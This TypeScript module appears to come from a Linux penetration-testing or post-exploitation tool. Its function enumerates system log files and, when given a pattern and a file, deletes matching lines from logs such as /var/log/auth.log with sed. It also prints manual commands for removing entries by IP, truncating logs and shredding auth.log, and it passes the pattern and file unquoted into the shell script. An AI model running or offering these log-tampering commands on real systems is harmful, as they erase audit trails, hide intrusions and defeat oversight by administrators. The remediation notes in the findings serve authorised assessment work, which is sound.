import { bash, sh, activeExec, argVal, hasFlag } from "./shared"
import type { Finding, HookResult } from "./shared"

export async function logTamper(args: string[], timeout: number): Promise<HookResult> {
  const findings: Finding[] = []
  const output: string[] = ["=== Log Tampering ==="]
  const pattern = argVal(args, "--pattern")
  const file = argVal(args, "--file")

  const script = `
echo "--- Log Files ---"
ls -lah /var/log/auth.log /var/log/secure /var/log/syslog /var/log/messages /var/log/kern.log /var/log/lastlog /var/log/wtmp /var/log/btmp 2>/dev/null

echo ""
echo "--- Log Permissions ---"
stat -c '%a %U:%G %n' /var/log/auth.log /var/log/secure /var/log/syslog /var/log/messages 2>/dev/null

echo ""
echo "--- Journald Status ---"
systemctl status systemd-journald 2>/dev/null | head -5
journalctl --disk-usage 2>/dev/null

${pattern && file ? `
echo ""
echo "--- Removing entries matching '${pattern}' from ${file} ---"
before=$(wc -l < "${file}" 2>/dev/null)
sed -i "/${pattern}/d" "${file}" 2>/dev/null
after=$(wc -l < "${file}" 2>/dev/null)
echo "Removed $((before - after)) line(s) from ${file}"
` : `
echo ""
echo "--- Usage ---"
echo "linuxhook log_tamper --file /var/log/auth.log --pattern '192.168.1.100'"
echo ""
echo "Manual examples:"
echo "  sed -i '/192.168.1.100/d' /var/log/auth.log"
echo "  > /var/log/auth.log  (clear entire file)"
echo "  shred -zu /var/log/auth.log  (secure delete)"
echo "  echo '' | tee /var/log/syslog  (truncate)"
`}
`

  const r = activeExec === "sh" ? await sh(script, timeout) : await bash(script, timeout)
  output.push(r.stdout || r.stderr)

  if (pattern && file && r.stdout.includes("Removed")) {
    findings.push({
      checkId: "LNX-LOGTAMP-001",
      provider: "linuxhook",
      severity: "HIGH",
      status: "EXPLOITED",
      resource: file,
      title: "Log entries tampered",
      details: `Entries matching '${pattern}' removed from ${file}`,
      remediation: "Ship logs to a remote SIEM in real-time. Use append-only log storage.",
    })
  }

  findings.push({
    checkId: "LNX-LOGTAMP-002",
    provider: "linuxhook",
    severity: "INFO",
    status: "IDENTIFIED",
    resource: "/var/log",
    title: "Log files enumerated",
    details: "System log files and permissions assessed for tampering viability",
    remediation: "Implement centralized logging with immutable storage. Enable log integrity monitoring.",
  })

  return { output: output.join("\n"), findings }
}
